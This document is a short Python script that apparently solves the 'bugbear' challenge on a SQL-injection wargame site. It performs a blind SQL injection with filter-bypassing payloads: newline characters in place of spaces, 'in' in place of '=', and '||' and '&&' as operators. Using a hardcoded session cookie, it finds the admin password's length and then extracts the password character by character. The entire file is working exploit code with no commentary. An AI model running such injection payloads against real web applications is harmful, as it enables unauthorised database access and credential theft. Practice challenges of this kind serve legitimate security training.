import requests

session_id={'PHPSESSID' : '9lk9bcf331rag94bic8mh63f46'}

length=0

for i in range(1, 20):
	url = "http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no=0||id%0ain(%22admin%22)%26%26length(pw)%0ain(\""+str(i)+"\")"
	respone = requests.get(url=url,cookies=session_id)
	print(respone.url)
			
	if "Hello admin" in respone.text:
			length=i
			print(length)
			break
pw=''
for i in range(1,length+1):
	for j in range(48,123):
		url = "http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no=0||id%0ain(%22admin%22)%26%26hex(mid(pw,"+str(i)+",1))%0ain(hex("+str(j)+"))"
		respone2=requests.get(url=url,cookies=session_id)	
		print(respone2.url)	
		if "Hello admin" in respone2.text:
			pw+=str(chr(j))
			print(pw)
			break
